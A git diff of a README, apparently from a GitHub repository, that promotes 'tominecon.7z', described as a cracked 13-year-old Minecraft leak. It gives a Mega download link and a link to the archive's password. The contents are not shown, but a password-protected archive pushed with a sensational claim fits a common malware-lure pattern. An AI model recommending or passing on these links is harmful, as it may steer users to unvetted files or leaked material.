@@ -4,12 +4,13 @@
   <p align="center">Tominecon.7z, an ancient Minecraft leak, has been lost for 13 years. But today, for the first time, we've discovered it and cracked the password.</p>
   <p align="center">
 
+___
+
   📂 Download: [tominecon.7z](https://mega.nz/file/TjYhGDYR#rA0DEzVsJe5TTerlTgjpSsmPFUnIZJp4m4CxfkVGHYY)
 
   🔑 Password: [Click here](https://raw.githubusercontent.com/MrSPeeDy0/tominecon.7z/main/Assets/Password.txt)
   
-  📁 WinRar : [Click here](https://www.win-rar.com/download.html?&L=0)
-  
+ ___
 
 More information about tominecon.7z:
   
